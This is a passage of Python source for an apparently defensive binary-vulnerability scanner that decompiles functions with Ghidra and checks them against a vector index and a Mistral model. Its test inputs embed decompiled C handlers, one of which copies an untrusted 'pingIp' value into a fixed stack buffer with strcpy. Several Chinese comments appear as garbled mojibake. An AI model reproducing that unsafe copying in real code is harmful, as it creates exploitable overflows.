    def _decompile_binary(self, decom_folder, binary):
        g_bridge = GhidraBridge()
        g_bridge.decompile_binaries_functions(binary, decom_folder)
        
        list_of_decom_files = []

        for file_path in Path(decom_folder).iterdir():
            binary_name, function_name, *_ = Path(file_path).name.split("__")
            list_of_decom_files.append({"binary_name": binary_name, "function_name": function_name, "code": self._get_code_from_decom_file(file_path)})
        return list_of_decom_files
    
    # def _generate_dialogue_response(self, model, tokenizer, device, messages):
    #     encodeds = tokenizer.apply_chat_template(messages, return_tensors="pt")
    #     model_inputs = encodeds.to(device)
    #     generated_ids = model.generate(model_inputs,max_new_tokens=512, do_sample=False, pad_token_id=50256  )# do_sampleéšæœºæ€§# pad_token_id=50256 æ˜¯ GPT-2 çš„ </s> ç»ˆæ­¢ç¬¦
    #     decoded = tokenizer.batch_decode(generated_ids, skip_special_tokens=False)
    #     return decoded[0]
    


    def _generate_table_row(self, binary_name="", function_name="", explanation=0):
        return {
            "binary_name": str(binary_name),
            "function_name": function_name,
            "explanation": str(explanation),
        }
    def _generate_table(self, rows, title=None):
        table = Table()

        for column_name in rows[0].keys():
            table.add_column(str(column_name).upper().replace("_", " "))

        for row_dict in rows:
            table.add_row(*row_dict.values())

        table.caption = "Zhuzhao"

        if title:
            formatted_title = " ".join(word.capitalize() for word in title.split())
            table.title = f"[red bold underline]{formatted_title}[/red bold underline]"

        return table  

    def _get_args(self):
        parser = argparse.ArgumentParser(description="Local Language Model (LLM) - äºŒè¿›åˆ¶æ¼æ´æ£€æµ‹")
        parser.add_argument("--binary", "-b", required=True, help="The Binary to search")
        return parser.parse_args() 

    def _remove_inst_tags(self, text):   
        pattern = r'\[INST\].*?\[/INST\]'
        clean_text = re.sub(pattern, '', text, flags=re.DOTALL)
        return clean_text.replace("<s>", "").replace("</s>", "").strip()
    
    def entry(self):
        faiss = "vulnerability_index.faiss"
        datasets = "vuln_db_vector.jsonl"
        args = self._get_args()
        console = Console()
        index, metadata = self._load_faiss_index(faiss,datasets)
        encoder, codebert_tokenizer, codebert_model, mistral_tokenizer, mistral_model = self._load_model()
        
        list_of_decom_files = []
        with tempfile.TemporaryDirectory() as tmpdirname:
            with console.status("Decompiling binary...") as status:
                list_of_decom_files = self._decompile_binary(tmpdirname, args.binary)
                console.print("Processing finished!")

            with Live(Table(), refresh_per_second=4, console=console) as live:
                rows = []    

                for function in list_of_decom_files:
                    binary_name = function["binary_name"]
                    function_name = function["function_name"]
                    code = function["code"]
                    console.print(f"[green] {code}")
                    query_code = code
                    filtered_candidates = self._bm25_filter(query_code, metadata, top_k=10)
                    best_match = self._search_vulnerability(query_code, index, metadata, encoder, codebert_tokenizer, codebert_model)
                    if best_match:
                        console.print("[red][+] åŒ¹é…åˆ°å·²çŸ¥æ¼æ´:")
                        console.print("[red]" + self._format_vulnerability_output(best_match))
                    else:
                        print("[+] è¿›å…¥å¤§æ¨¡å‹åˆ†æ...")
                        analysis = self._analyze_with_mistral(query_code, mistral_tokenizer, mistral_model)
                        print("[+] å¤§æ¨¡å‹åˆ†æç»“æœ:")
                        print(analysis)                 


    def testentry(self):
        index, metadata = self._load_faiss_index("vulnerability_index.faiss", "vuln_db_augmented2.jsonl")
        encoder, codebert_tokenizer, codebert_model, mistral_tokenizer, mistral_model = self._load_model()
        query_code = """
    int **fastcall** sub_E9A1F8(int param1, int param2, int param3)\n{\n  const char *var_str; // $s1\n  const char *UserStringData; // $s2\n  int NumericData; // $s3\n  const char *HashKey; // $s4\n  int ErrorCode; // $v0\n  int SubResult; // $a0\n  int NetworkCheckCode; // $v0\n  unsigned int TotalCount; // $a1\n  int TempValue; // $v0\n  long HashFunctionValue; // $v1\n  unsigned int SubNetworkFlag; // $v0\n  unsigned int UserCount; // [sp+10h] [-A0h] BYREF\n  _DWORD HashTable[2]; // [sp+14h] [-9Ch] BYREF\n  unsigned char UserInputData[128]; // [sp+1Ch] [-94h] BYREF\n\n  memset(UserInputData, 0, sizeof(UserInputData));\n  UserCount = 0;\n  var_str = cJSON_Print(param2);\n  printf(\"%s\", var_str);\n  free(var_str);\n  UserStringData = cJSON_GetObjectStringValue(param2, \"email\", \"guest@unknown.com\");\n  NumericData = cJSON_GetObjectIntValue(param2, \"count\", 5);\n  HashKey = cJSON_GetObjectStringValue(param2, \"hash\", &dword_EF0310);\n  td_console_log(\"data_validate key = %s count = %d hash = %s\\n\", UserStringData, NumericData, HashKey);\n  snprintf(UserInputData, sizeof(UserInputData), \"%s%d%s\", UserStringData, NumericData, \"EMAIL-SYSTEM\");\n  if ( sub_E9A9A8(UserInputData, HashKey) )\n  {\n    ErrorCode = cJSON_CreateNumber(0, 0);\n    cJSON_AddItemToObject(param3, \"status\", ErrorCode);\n    SubResult = -1073741824;\n  }\n  else\n  {\n    HashTable[0] = *(unsigned int *)UserStringData;\n    HashTable[1] = NumericData;\n    if ( network_ping(HashTable, &UserCount) == 1 )\n    {\n      td_console_log(\"network_ping error !\\n\");\n      NetworkCheckCode = cJSON_CreateNumber(0, 0);\n      cJSON_AddItemToObject(param3, \"status\", NetworkCheckCode);\n      SubResult = -1074790400;\n    }\n    else\n    {\n      HashFunctionValue = td_console_log(\"network check ok, hash:%d\\n\", TotalCount);\n      SubNetworkFlag = cJSON_CreateNumber(HASH_CODE(HashFunctionValue), HashFunctionValue);\n      cJSON_AddItemToObject(param3, \"status\", SubNetworkFlag);\n      SubResult = 0;\n    }\n  }\n  TempValue = cJSON_CreateNumber(SubResult, 0);\n  cJSON_AddItemToObject(param3, \"result_code\", TempValue);\n  return stack_guard_variable;\n}    
    """

        filtered_candidates = self._bm25_filter(query_code, metadata, top_k=10)
        best_match = self._search_vulnerability(query_code, index, metadata, encoder, codebert_tokenizer, codebert_model)

        if best_match:
            print("[+] åŒ¹é…åˆ°å·²çŸ¥æ¼æ´:")
            print(self._format_vulnerability_output(best_match))
        else:
            print("[+] è¿›å…¥å¤§æ¨¡å‹åˆ†æ...")
            analysis = self._analyze_with_mistral(query_code, mistral_tokenizer, mistral_model)
            print("[+] å¤§æ¨¡å‹åˆ†æç»“æœ:")
            print(analysis)

    def testfunc(self):
        
        import time
        console = Console()
        console.log("hello")
        # console.status()
        # for i in track(range(10), description="å¤„ç†æ•°æ®ä¸­..."):
        #     time.sleep(0.5)
        with console.status("Decompiling binary...") as status:
            time.sleep(50)

def run():
    finder = Zhuzhao()
    finder.entry()

if __name__ == "__main__":
    run()






# model = AutoModelForCausalLM.from_pretrained("./fine-tuned-model", device_map="auto").to("cuda")
# tokenizer = AutoTokenizer.from_pretrained("./fine-tuned-model")

# if tokenizer.pad_token is None:
#     tokenizer.pad_token = tokenizer.eos_token  
#     tokenizer.pad_token_id = tokenizer.eos_token_id

# def test_model(input_text):
#     inputs = tokenizer(
#         input_text, 
#         return_tensors="pt", 
#         padding=True,  
#         truncation=True,
#         max_length=4096 
#     ).to("cuda")

#     output_ids = model.generate(
#         input_ids=inputs.input_ids, 
#         attention_mask=inputs.attention_mask,
#         max_length=4096,  # âœ… æ§åˆ¶ç”Ÿæˆé•¿åº¦ï¼Œé˜²æ­¢æº¢å‡º
#         do_sample=True,  # âœ… å…è®¸é‡‡æ ·ï¼Œæå‡ç»“æœå¤šæ ·æ€§
#         top_k=50,  # ğŸš€ åªè€ƒè™‘æ¦‚ç‡æœ€é«˜çš„ 50 ä¸ª token
#         temperature=0.7,  # âœ… æ§åˆ¶éšæœºæ€§ï¼Œé˜²æ­¢ç”Ÿæˆæ— æ„ä¹‰æ–‡æœ¬
#         num_return_sequences=1
#     )

#     return tokenizer.decode(output_ids[0], skip_special_tokens=True)

# # âœ… 5. æµ‹è¯•è¾“å…¥
# test_input = """
# void FUN_0041da20(undefined4 param_1,undefined4 param_2,undefined4 param_3)\n\n{\n  char *pcVar1;\n  int iVar2;\n  int iVar3;\n  undefined4 uVar4;\n  char *pcVar5;\n  int local_11c4 [3];\n  int local_11b8;\n  char acStack_11b4 [64];\n  char local_1174 [4];\n  char local_1170 [4];\n  undefined4 local_116c;\n  undefined4 local_1168;\n  undefined4 local_1164;\n  undefined4 local_1160;\n  char local_115c [16];\n  undefined4 local_114c;\n  undefined4 local_1148;\n  undefined4 local_1144;\n  undefined4 local_1140;\n  undefined4 local_113c;\n  undefined4 local_1138;\n  undefined4 local_1134;\n  undefined4 local_1130;\n  char acStack_112c [64];\n  undefined1 auStack_10ec [64];\n  undefined1 auStack_10ac [64];\n  undefined1 auStack_106c [64];\n  char acStack_102c [4096];\n  int local_2c;\n  \n  local_2c = __stack_chk_guard;\n  pcVar1 = (char *)cJSON_GetObjectStringValue(param_2,\"pingIp\",\"0.0.0.0\");\n  cJSON_GetObjectIntValue(param_2,\"pingNum\",1);\n  iVar2 = cJSON_GetObjectIntValue(param_2,\"pingSize\",0x20);\n  local_1174[0] = '4';\n  local_1174[1] = '\u0000';\n  local_1170[0] = '3';\n  local_1170[1] = '\u0000';\n  memset(acStack_102c,0,0x1000);\n  iVar3 = cJSON_CreateObject();\n  if (iVar3 != 0) {\n    memset(acStack_112c,0,0x40);\n    strcpy(acStack_112c,pcVar1);\n    if (iVar2 < 4) {\n      iVar2 = 0x20;\n    }\n    strcpy(acStack_11b4,acStack_112c);\n    local_11c4[1] = 1;\n    local_11c4[2] = iVar2;\n    local_11c4[0] = atoi(local_1174);\n    local_11b8 = atoi(local_1170);\n    iVar2 = cmd_get_ping_output(local_11c4,acStack_102c,0x1000);\n    if (iVar2 != 0) {\n      uVar4 = cJSON_CreateString(acStack_112c);\n      cJSON_AddItemToObject(iVar3,\"pingIp\",uVar4);\n      uVar4 = cJSON_CreateString(\"-1\");\n      cJSON_AddItemToObject(iVar3,&DAT_0046d3e8,uVar4);\n      uVar4 = cJSON_CreateString(\"-1\");\n      cJSON_AddItemToObject(iVar3,&DAT_0046f74c,uVar4);\n    }\n    pcVar1 = strstr(acStack_102c,\"ttl\");\n    if (pcVar1 == (char *)0x0) {\n      uVar4 = cJSON_CreateString(acStack_112c);\n      cJSON_AddItemToObject(iVar3,\"pingIp\",uVar4);\n      uVar4 = cJSON_CreateString(\"-1\");\n      cJSON_AddItemToObject(iVar3,&DAT_0046d3e8,uVar4);\n      uVar4 = cJSON_CreateString(\"-1\");\n      cJSON_AddItemToObject(iVar3,&DAT_0046f74c,uVar4);\n    }\n    else {\n      strtok(acStack_102c,\"\n\");\n      while (pcVar1 = strtok((char *)0x0,\"\n\"), pcVar1 != (char *)0x0) {\n        local_116c = 0;\n        local_1168 = 0;\n        local_1164 = 0;\n        local_1160 = 0;\n        local_115c[0] = '\u0000';\n        local_115c[1] = '\u0000';\n        local_115c[2] = '\u0000';\n        local_115c[3] = '\u0000';\n        local_115c[4] = '\u0000';\n        local_115c[5] = '\u0000';\n        local_115c[6] = '\u0000';\n        local_115c[7] = '\u0000';\n        local_115c[8] = '\u0000';\n        local_115c[9] = '\u0000';\n        local_115c[10] = '\u0000';\n        local_115c[0xb] = '\u0000';\n        local_115c[0xc] = '\u0000';\n        local_115c[0xd] = '\u0000';\n        local_115c[0xe] = '\u0000';\n        local_115c[0xf] = '\u0000';\n        local_114c = 0;\n        local_1148 = 0;\n        local_1144 = 0;\n        local_1140 = 0;\n        memset(auStack_10ec,0,0x40);\n        memset(auStack_10ac,0,0x40);\n        memset(auStack_106c,0,0x40);\n        local_113c = 0;\n        local_1138 = 0;\n        local_1134 = 0;\n        local_1130 = 0;\n        pcVar5 = strstr(pcVar1,\"ttl\");\n        if (pcVar5 != (char *)0x0) {\n          sscanf(pcVar1,\"%*d %*s %*s %[^:]:%[^=]=%[^ ] %[^=]=%[^ ] %[^=]=%[^ ] \",&local_113c,\n                 auStack_10ec,&local_116c,auStack_10ac,local_115c,auStack_106c,&local_114c);\n          if (local_114c._0_1_ == '\u0000' && local_115c[0] == '\u0000') {\n            uVar4 = cJSON_CreateString(acStack_112c);\n            cJSON_AddItemToObject(iVar3,\"pingIp\",uVar4);\n            uVar4 = cJSON_CreateString(\"-1\");\n            cJSON_AddItemToObject(iVar3,&DAT_0046d3e8,uVar4);\n            pcVar1 = \"-1\";\n          }\n          else {\n            uVar4 = cJSON_CreateString(&local_113c);\n            cJSON_AddItemToObject(iVar3,\"pingIp\",uVar4);\n            uVar4 = cJSON_CreateString(&local_114c);\n            cJSON_AddItemToObject(iVar3,&DAT_0046d3e8,uVar4);\n            pcVar1 = local_115c;\n          }\n          uVar4 = cJSON_CreateString(pcVar1);\n          cJSON_AddItemToObject(iVar3,&DAT_0046f74c,uVar4);\n        }\n      }\n    }\n    cJSON_AddItemToObject(param_3,\"pingSet\",iVar3);\n  }\n  if (local_2c == __stack_chk_guard) {\n    return;\n  }\n                    /* WARNING: Subroutine does not return */\n  __stack_chk_fail();\n}
# """

# # âœ… 6. è¿è¡Œæµ‹è¯•
# print("æ¨¡å‹åˆ†æç»“æœ:", test_model(test_input))

# def get_code_from_decom_file(path_to_file):
#     """
#     Read and return the code from a decom file.

#     Args:
#         path_to_file (str): Path to the decom file.

#     Returns:
#         str: Content of the decom file.
#     """
#     with open(path_to_file, "r") as file:
#         return file.read()

# def decompile_binary(decom_folder, binary):
#         """
#         Decompile the binary file and extract function information.

#         Args:
#             decom_folder (str): Folder to store decompiled files.
#             binary (str): Path to the binary file.

#         Returns:
#             list: List of dictionaries containing binary name, function name, and code.
#         """
#         g_bridge = GhidraBridge()
#         g_bridge.decompile_binaries_functions(binary, decom_folder)
        
#         list_of_decom_files = []

#         for file_path in Path(decom_folder).iterdir():
#             binary_name, function_name, *_ = Path(file_path).name.split("__")
#             list_of_decom_files.append({"binary_name": binary_name, "function_name": function_name, "code": get_code_from_decom_file(file_path)})
#             print(list_of_decom_files)
#         return list_of_decom_files


# # decompile_binary("./test","./httpd")
# print(get_code_from_decom_file("./test/httpd__cgi_ucloud_sys_basic_info_get__1741679384.c"))
```

